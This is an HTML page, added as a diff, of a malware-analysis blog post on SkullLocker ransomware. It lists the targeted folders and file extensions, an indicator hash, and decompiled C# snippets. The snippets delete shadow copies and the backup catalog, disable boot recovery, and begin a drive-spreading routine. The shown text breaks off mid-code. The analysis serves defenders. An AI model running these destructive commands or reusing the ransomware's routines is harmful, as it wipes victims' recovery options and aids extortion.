@@ -1,0 +1,1051 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>SkulLocker - c3p0d4y</title><meta name="Description" content="Welcome to c3p0d4y"><meta property="og:title" content="SkulLocker" />
+<meta property="og:description" content="SkullLocker Ransomware SkullLocker is a type of malwares that encrypts files on infected computers and demands payment for decryption. it spread thourgh the same techniques used by most of knowen malwares like phishing emails or malicious websites , software vulnerabilities. it was discovered in 2016 and since then several of the ransomware have been found in the wild .
+the malware could perform the following functions/techniques :
+randomize file extensions with 4 char strings ( Program." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://c3p0d4y.github.io/2023/03/skullocker/" /><meta property="og:image" content="https://c3p0d4y.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-10T14:28:32+01:00" />
+<meta property="article:modified_time" content="2023-03-10T14:28:32+01:00" /><meta property="og:site_name" content="c3p0d4y" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://c3p0d4y.github.io/logo.png"/>
+
+<meta name="twitter:title" content="SkulLocker"/>
+<meta name="twitter:description" content="SkullLocker Ransomware SkullLocker is a type of malwares that encrypts files on infected computers and demands payment for decryption. it spread thourgh the same techniques used by most of knowen malwares like phishing emails or malicious websites , software vulnerabilities. it was discovered in 2016 and since then several of the ransomware have been found in the wild .
+the malware could perform the following functions/techniques :
+randomize file extensions with 4 char strings ( Program."/>
+<meta name="application-name" content="c3p0d4y">
+<meta name="apple-mobile-web-app-title" content="c3p0d4y"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://c3p0d4y.github.io/2023/03/skullocker/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SkulLocker",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/c3p0d4y.github.io\/2023\/03\/skullocker\/"
+        },"genre": "posts","keywords": "Ransomware, Reversing, SkullLocker","wordcount":  2355 ,
+        "url": "https:\/\/c3p0d4y.github.io\/2023\/03\/skullocker\/","datePublished": "2023-03-10T14:28:32+01:00","dateModified": "2023-03-10T14:28:32+01:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "c3p0d4y"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="c3p0d4y"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="c3p0d4y"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SkulLocker</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://c3p0d4y.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>c3p0d4y</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ransomware/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ransomware</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-10">2023-03-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2355 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#indicators-of-compromise">Indicators of Compromise</a></li>
+    <li><a href="#analysis">Analysis</a>
+      <ul>
+        <li><a href="#infection-chain">Infection Chain</a></li>
+        <li><a href="#encryption-methodes">Encryption methodes</a>
+          <ul>
+            <li><a href="#directory-encryption">Directory Encryption</a></li>
+            <li><a href="#file-encryption">file Encryption</a></li>
+            <li><a href="#rsa-encryption">RSA encryption</a></li>
+            <li><a href="#aes-encryption">AES encryption</a></li>
+            <li><a href="#password-used-in-the-encryption">Password used in the encryption</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#detection">Detection</a>
+      <ul>
+        <li><a href="#yara">YARA</a></li>
+        <li><a href="#mitre-attack">Mitre Attack</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#contributors">Contributors</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="skulllocker-ransomware">SkullLocker Ransomware</h1>
+<p>SkullLocker  is a type of malwares that encrypts files on infected computers and demands payment for decryption.
+it spread thourgh the same techniques used by most of knowen malwares like phishing emails or malicious websites , software vulnerabilities.  it was discovered in 2016 and since then several of the ransomware have been found in the wild .</p>
+<p>the malware could perform the following functions/techniques :</p>
+<ul>
+<li>randomize file extensions with 4 char strings (  Program.RandomStringForExtension(4)))</li>
+<li>Spread through svchost.exe process</li>
+<li>add RegKey   : SOFTWARE\Microsoft\Windows\CurrentVersion\Run  in $location using the key microsoft store</li>
+<li>locations :</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="s">&#34;\\Desktop&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Links&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Contacts&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Desktop&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Documents&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Downloads&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Pictures&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Music&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\OneDrive&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Saved Games&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Favorites&#34;</span><span class="p">;</span><span class="err">            </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Searches&#34;</span><span class="p">;</span><span class="err">      </span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;\\Videos&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Extensions :</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s2">&#34;.txt&#34;</span>,<span class="s2">&#34;.jar&#34;</span>,<span class="s2">&#34;.dat&#34;</span>,<span class="s2">&#34;.contact&#34;</span>,<span class="s2">&#34;.settings&#34;</span>,<span class="s2">&#34;.doc&#34;</span>,<span class="s2">&#34;.docx&#34;</span>,<span class="s2">&#34;.xls&#34;</span>,<span class="s2">&#34;.xlsx&#34;</span>,<span class="s2">&#34;.ppt&#34;</span>,<span class="s2">&#34;.pptx&#34;</span>,<span class="s2">&#34;.odt&#34;</span>,<span class="s2">&#34;.jpg&#34;</span>,<span class="s2">&#34;.mka&#34;</span>,<span class="s2">&#34;.mhtml&#34;</span>,<span class="s2">&#34;.oqy&#34;</span>,<span class="s2">&#34;.png&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.csv&#34;</span>,<span class="s2">&#34;.py&#34;</span>,<span class="s2">&#34;.sql&#34;</span>,<span class="s2">&#34;.mdb&#34;</span>,<span class="s2">&#34;.php&#34;</span>,<span class="s2">&#34;.asp&#34;</span>,<span class="s2">&#34;.aspx&#34;</span>,<span class="s2">&#34;.html&#34;</span>,<span class="s2">&#34;.htm&#34;</span>,<span class="s2">&#34;.xml&#34;</span>,<span class="s2">&#34;.psd&#34;</span>,<span class="s2">&#34;.pdf&#34;</span>,<span class="s2">&#34;.xla&#34;</span>,<span class="s2">&#34;.cub&#34;</span>,<span class="s2">&#34;.dae&#34;</span>,<span class="s2">&#34;.indd&#34;</span>,<span class="s2">&#34;.cs&#34;</span>,<span class="s2">&#34;.mp3&#34;</span>,<span class="s2">&#34;.mp4&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.dwg&#34;</span>,<span class="s2">&#34;.zip&#34;</span>,<span class="s2">&#34;.rar&#34;</span>,<span class="s2">&#34;.mov&#34;</span>,<span class="s2">&#34;.rtf&#34;</span>,<span class="s2">&#34;.bmp&#34;</span>,<span class="s2">&#34;.mkv&#34;</span>,<span class="s2">&#34;.avi&#34;</span>,<span class="s2">&#34;.apk&#34;</span>,<span class="s2">&#34;.lnk&#34;</span>,<span class="s2">&#34;.dib&#34;</span>,<span class="s2">&#34;.dic&#34;</span>,<span class="s2">&#34;.dif&#34;</span>,<span class="s2">&#34;.divx&#34;</span>,<span class="s2">&#34;.iso&#34;</span>,<span class="s2">&#34;.7zip&#34;</span>,<span class="s2">&#34;.ace&#34;</span>,<span class="s2">&#34;.arj&#34;</span>,<span class="s2">&#34;.bz2&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.cab&#34;</span>,<span class="s2">&#34;.gzip&#34;</span>,<span class="s2">&#34;.lzh&#34;</span>,<span class="s2">&#34;.tar&#34;</span>,<span class="s2">&#34;.jpeg&#34;</span>,<span class="s2">&#34;.xz&#34;</span>,<span class="s2">&#34;.mpeg&#34;</span>,<span class="s2">&#34;.torrent&#34;</span>,<span class="s2">&#34;.mpg&#34;</span>,<span class="s2">&#34;.core&#34;</span>,<span class="s2">&#34;.pdb&#34;</span>,<span class="s2">&#34;.ico&#34;</span>,<span class="s2">&#34;.pas&#34;</span>,<span class="s2">&#34;.db&#34;</span>,<span class="s2">&#34;.wmv&#34;</span>,<span class="s2">&#34;.swf&#34;</span>,<span class="s2">&#34;.cer&#34;</span>,<span class="s2">&#34;.bak&#34;</span>,<span class="s2">&#34;.backup&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.accdb&#34;</span>,<span class="s2">&#34;.bay&#34;</span>,<span class="s2">&#34;.p7c&#34;</span>,<span class="s2">&#34;.exif&#34;</span>,<span class="s2">&#34;.vss&#34;</span>,<span class="s2">&#34;.raw&#34;</span>,<span class="s2">&#34;.m4a&#34;</span>,<span class="s2">&#34;.wma&#34;</span>,<span class="s2">&#34;.flv&#34;</span>,<span class="s2">&#34;.sie&#34;</span>,<span class="s2">&#34;.sum&#34;</span>,<span class="s2">&#34;.ibank&#34;</span>,<span class="s2">&#34;.wallet&#34;</span>,<span class="s2">&#34;.css&#34;</span>,<span class="s2">&#34;.js&#34;</span>,<span class="s2">&#34;.rb&#34;</span>,<span class="s2">&#34;.crt&#34;</span>,<span class="s2">&#34;.xlsm&#34;</span>,<span class="s2">&#34;.xlsb&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.7z&#34;</span>,<span class="s2">&#34;.cpp&#34;</span>,<span class="s2">&#34;.java&#34;</span>,<span class="s2">&#34;.jpe&#34;</span>,<span class="s2">&#34;.ini&#34;</span>,<span class="s2">&#34;.blob&#34;</span>,<span class="s2">&#34;.wps&#34;</span>,<span class="s2">&#34;.docm&#34;</span>,<span class="s2">&#34;.wav&#34;</span>,<span class="s2">&#34;.3gp&#34;</span>,<span class="s2">&#34;.webm&#34;</span>,<span class="s2">&#34;.m4v&#34;</span>,<span class="s2">&#34;.amv&#34;</span>,<span class="s2">&#34;.m4p&#34;</span>,<span class="s2">&#34;.svg&#34;</span>,<span class="s2">&#34;.ods&#34;</span>,<span class="s2">&#34;.bk&#34;</span>,<span class="s2">&#34;.vdi&#34;</span>,<span class="s2">&#34;.vmdk&#34;</span>,<span class="s2">&#34;.onepkg&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.accde&#34;</span>,<span class="s2">&#34;.jsp&#34;</span>,<span class="s2">&#34;.json&#34;</span>,<span class="s2">&#34;.gif&#34;</span>,<span class="s2">&#34;.log&#34;</span>,<span class="s2">&#34;.gz&#34;</span>,<span class="s2">&#34;.config&#34;</span>,<span class="s2">&#34;.vb&#34;</span>,<span class="s2">&#34;.m1v&#34;</span>,<span class="s2">&#34;.sln&#34;</span>,<span class="s2">&#34;.pst&#34;</span>,<span class="s2">&#34;.obj&#34;</span>,<span class="s2">&#34;.xlam&#34;</span>,<span class="s2">&#34;.djvu&#34;</span>,<span class="s2">&#34;.inc&#34;</span>,<span class="s2">&#34;.cvs&#34;</span>,<span class="s2">&#34;.dbf&#34;</span>,<span class="s2">&#34;.tbi&#34;</span>,<span class="s2">&#34;.wpd&#34;</span>,<span class="s2">&#34;.dot&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.dotx&#34;</span>,<span class="s2">&#34;.xltx&#34;</span>,<span class="s2">&#34;.pptm&#34;</span>,<span class="s2">&#34;.potx&#34;</span>,<span class="s2">&#34;.potm&#34;</span>,<span class="s2">&#34;.pot&#34;</span>,<span class="s2">&#34;.xlw&#34;</span>,<span class="s2">&#34;.xps&#34;</span>,<span class="s2">&#34;.xsd&#34;</span>,<span class="s2">&#34;.xsf&#34;</span>,<span class="s2">&#34;.xsl&#34;</span>,<span class="s2">&#34;.kmz&#34;</span>,<span class="s2">&#34;.accdr&#34;</span>,<span class="s2">&#34;.stm&#34;</span>,<span class="s2">&#34;.accdt&#34;</span>,<span class="s2">&#34;.ppam&#34;</span>,<span class="s2">&#34;.pps&#34;</span>,<span class="s2">&#34;.ppsm&#34;</span>,<span class="s2">&#34;.1cd&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.3ds&#34;</span>,<span class="s2">&#34;.3fr&#34;</span>,<span class="s2">&#34;.3g2&#34;</span>,<span class="s2">&#34;.accda&#34;</span>,<span class="s2">&#34;.accdc&#34;</span>,<span class="s2">&#34;.accdw&#34;</span>,<span class="s2">&#34;.adp&#34;</span>,<span class="s2">&#34;.ai&#34;</span>,<span class="s2">&#34;.ai3&#34;</span>,<span class="s2">&#34;.ai4&#34;</span>,<span class="s2">&#34;.ai5&#34;</span>,<span class="s2">&#34;.ai6&#34;</span>,<span class="s2">&#34;.ai7&#34;</span>,<span class="s2">&#34;.ai8&#34;</span>,<span class="s2">&#34;.arw&#34;</span>,<span class="s2">&#34;.ascx&#34;</span>,<span class="s2">&#34;.asm&#34;</span>,<span class="s2">&#34;.asmx&#34;</span>,<span class="s2">&#34;.avs&#34;</span>,<span class="s2">&#34;.bin&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.cfm&#34;</span>,<span class="s2">&#34;.dbx&#34;</span>,<span class="s2">&#34;.dcm&#34;</span>,<span class="s2">&#34;.dcr&#34;</span>,<span class="s2">&#34;.pict&#34;</span>,<span class="s2">&#34;.rgbe&#34;</span>,<span class="s2">&#34;.dwt&#34;</span>,<span class="s2">&#34;.f4v&#34;</span>,<span class="s2">&#34;.exr&#34;</span>,<span class="s2">&#34;.kwm&#34;</span>,<span class="s2">&#34;.max&#34;</span>,<span class="s2">&#34;.mda&#34;</span>,<span class="s2">&#34;.mde&#34;</span>,<span class="s2">&#34;.mdf&#34;</span>,<span class="s2">&#34;.mdw&#34;</span>,<span class="s2">&#34;.mht&#34;</span>,<span class="s2">&#34;.mpv&#34;</span>,<span class="s2">&#34;.msg&#34;</span>,<span class="s2">&#34;.myi&#34;</span>,<span class="s2">&#34;.nef&#34;</span>,<span class="s2">&#34;.odc&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.geo&#34;</span>,<span class="s2">&#34;.swift&#34;</span>,<span class="s2">&#34;.odm&#34;</span>,<span class="s2">&#34;.odp&#34;</span>,<span class="s2">&#34;.oft&#34;</span>,<span class="s2">&#34;.orf&#34;</span>,<span class="s2">&#34;.pfx&#34;</span>,<span class="s2">&#34;.p12&#34;</span>,<span class="s2">&#34;.pl&#34;</span>,<span class="s2">&#34;.pls&#34;</span>,<span class="s2">&#34;.safe&#34;</span>,<span class="s2">&#34;.tab&#34;</span>,<span class="s2">&#34;.vbs&#34;</span>,<span class="s2">&#34;.xlk&#34;</span>,<span class="s2">&#34;.xlm&#34;</span>,<span class="s2">&#34;.xlt&#34;</span>,<span class="s2">&#34;.xltm&#34;</span>,<span class="s2">&#34;.svgz&#34;</span>,<span class="s2">&#34;.slk&#34;</span>,<span class="s2">&#34;.tar.gz&#34;</span>,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;.dmg&#34;</span>,<span class="s2">&#34;.ps&#34;</span>,<span class="s2">&#34;.psb&#34;</span>,<span class="s2">&#34;.tif&#34;</span>,<span class="s2">&#34;.rss&#34;</span>,<span class="s2">&#34;.key&#34;</span>,<span class="s2">&#34;.vob&#34;</span>,<span class="s2">&#34;.epsp&#34;</span>,<span class="s2">&#34;.dc3&#34;</span>,<span class="s2">&#34;.iff&#34;</span>,<span class="s2">&#34;.onepkg&#34;</span>,<span class="s2">&#34;.onetoc2&#34;</span>,<span class="s2">&#34;.opt&#34;</span>,<span class="s2">&#34;.p7b&#34;</span>,<span class="s2">&#34;.pam&#34;</span>,<span class="s2">&#34;.r3d&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="indicators-of-compromise">Indicators of Compromise</h2>
+<p>The sample used in this article is the same one mentioned by <a href="https://www.dgssi.gov.ma/fr/content/4061060323-skulllocker-ransomware.html" target="_blank" rel="noopener noreffer ">macert</a> team .</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Indicator</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SHA256</td>
+<td>bb5ca9d8de51734dbd14dc081c7c892d819cd14fafd7ccd62849d70f9e679369</td>
+<td>SkullLocker Main Ransomware</td>
+</tr>
+</tbody>
+</table>
+<h2 id="analysis">Analysis</h2>
+<p>According to first analysis it appears that the ransomware is built using .net .</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/die.png"
+        data-srcset="/images/die.png, /images/die.png 1.5x, /images/die.png 2x"
+        data-sizes="auto"
+        alt="/images/die.png"
+        title="detect it easy" /></p>
+<p>the ransomware doesn&rsquo;t have any obfuscation techniques all you need to decompile it using .net tools and you will have the source code ( i personaly hate these kind of ransomwares since i do not enjoy breaking them down).</p>
+<p>in order to understand how it works we will cover the principal methodes and functions that is used to encrypt files and how it work in general .</p>
+<h3 id="infection-chain">Infection Chain</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="n">deleteShadowCopies</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">Program</span><span class="p">.</span><span class="n">runCommand</span><span class="p">(</span><span class="s">&#34;vssadmin delete shadows /all /quiet &amp; wmic shadowcopy delete&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>delete all the shadow copies on the system to prevent users from recovering previous versions of files or folders.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="n">disableRecoveryMode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">Program</span><span class="p">.</span><span class="n">runCommand</span><span class="p">(</span><span class="s">&#34;bcdedit /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>configure the Windows Boot Manager settings to ignore any boot failures and disable the automatic startup repair .</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="n">deleteBackupCatalog</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">Program</span><span class="p">.</span><span class="n">runCommand</span><span class="p">(</span><span class="s">&#34;wbadmin delete catalog -quiet&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Delete the backup catalog. The backup catalog is a database that contains information about the backups created using Windows Backup .</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">spreadName</span> <span class="p">=</span> <span class="s">&#34;skull.exe&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="n">spreadIt</span><span class="p">(</span><span class="kt">string</span> <span class="n">spreadName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">foreach</span> <span class="p">(</span><span class="n">DriveInfo</span> <span class="n">driveInfo</span> <span class="k">in</span> <span class="n">DriveInfo</span><span class="p">.</span><span class="n">GetDrives</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
